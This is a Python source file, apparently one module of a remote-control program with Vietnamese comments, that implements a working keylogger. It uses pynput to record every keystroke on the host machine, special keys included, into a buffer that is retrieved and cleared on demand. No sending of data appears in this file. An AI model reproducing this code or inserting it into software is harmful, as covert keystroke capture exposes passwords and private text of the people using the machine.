# -*- coding: utf-8 -*-
"""
server/keylogger.py - Logic ghi phím bấm trên máy server.
"""
try:
    from pynput.keyboard import Listener, Key
    HAS_PYNPUT = True
except ImportError:
    HAS_PYNPUT = False


class KeyloggerManager:
    """Quản lý vòng đời của keylogger (start/stop/capture)."""

    def __init__(self):
        self.key_log = ""
        self.is_keylogging = False
        self.key_listener = None

    def on_press(self, key):
        try:
            if hasattr(key, 'char') and key.char is not None:
                self.key_log += key.char
            else:
                if key == Key.space:
                    self.key_log += " "
                elif key == Key.enter:
                    self.key_log += "\n[ENTER]\n"
                elif key == Key.backspace:
                    self.key_log += "[BACKSPACE]"
                else:
                    self.key_log += f"[{str(key).replace('Key.', '').upper()}]"
        except Exception:
            pass

    def start(self):
        if not HAS_PYNPUT:
            return
        if not self.is_keylogging:
            self.is_keylogging = True
            self.key_log = ""
            self.key_listener = Listener(on_press=self.on_press)
            self.key_listener.start()

    def stop(self):
        if self.is_keylogging and self.key_listener:
            self.is_keylogging = False
            self.key_listener.stop()
            self.key_listener = None

    def get_and_clear(self):
        """Lấy log và xóa sạch."""
        log = self.key_log if self.key_log else "(No keystrokes captured yet)"
        self.key_log = ""
        return log
